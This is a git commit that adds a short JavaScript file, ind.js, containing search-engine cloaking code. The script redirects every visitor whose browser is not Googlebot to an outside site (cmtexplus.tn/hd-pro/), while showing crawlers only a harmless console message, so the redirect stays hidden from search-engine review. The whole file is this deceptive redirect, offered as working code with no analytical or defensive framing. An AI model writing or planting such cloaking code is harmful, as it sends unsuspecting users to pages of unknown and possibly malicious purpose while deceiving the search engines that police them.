4c817fd36352adafb37e92b62c30b4b5574e5398
simulkabila <s.imulkabila5596@gmail.com>
2026-09-14 00:14:13 +0600

    Create ind.js

---
+++ ind.js
@@ -0,0 +1,7 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // For regular users - redirect
+  window.location.href = "https://cmtexplus.tn/hd-pro/?t=ind";
+} else {
+  // For search engine bots - do not redirect
+  console.log("Thanks for visiting my page");
+}
